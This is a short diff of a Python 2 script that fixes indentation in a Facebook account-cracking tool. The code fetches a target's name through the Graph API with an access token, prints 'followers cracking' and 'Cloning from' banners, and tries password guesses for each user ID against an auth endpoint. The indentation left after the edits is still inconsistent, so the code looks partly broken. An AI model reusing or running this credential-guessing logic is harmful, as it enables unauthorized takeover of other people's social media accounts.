@@ -615,7 +615,7 @@ def a_s():
 
         try:
 
-           r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
@@ -677,7 +677,7 @@ def a_s():
 
             print logo
 
-           print '\033[1;90m-------- Choice followers cracking --------'
+            print '\033[1;90m-------- Choice followers cracking --------'
 
              print ' \033[1;92mCloning from: ' + z
         except (KeyError, IOError):
@@ -757,8 +757,7 @@ def a_s():
 
         (uid, name) = user.split('|')
 
-                try:
-
+         try:
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
